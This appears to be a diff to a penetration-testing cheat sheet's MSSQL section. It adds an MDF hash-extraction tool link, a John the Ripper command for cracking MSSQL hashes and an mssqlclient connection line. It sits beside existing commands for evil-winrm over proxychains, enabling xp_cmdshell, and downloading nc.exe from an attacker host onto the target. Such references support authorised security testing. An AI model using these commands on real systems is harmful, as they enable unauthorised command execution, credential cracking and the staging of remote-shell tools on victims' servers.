@@ -742,7 +742,14 @@ proxychains evil-winrm -i '<host>' -u '<username>'
 
 ### :open_file_folder: MSSQL
 
+[Extract hash from MDF](https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes)
+
+```shell
+john --format=mssql12 --wordlist=<rockyou.txt> hash
+```
+
 ```mssql
+/* python3 mssqlclient.py [[domain/]username[:password]@]<targetName or ip> */
 /* sysadmin fixed server role */
 enable_xp_cmdshell
 xp_cmdshell "powershell.exe wget http://<attacker ip>/nc.exe -OutFile c:\\Users\Public\\nc.exe"
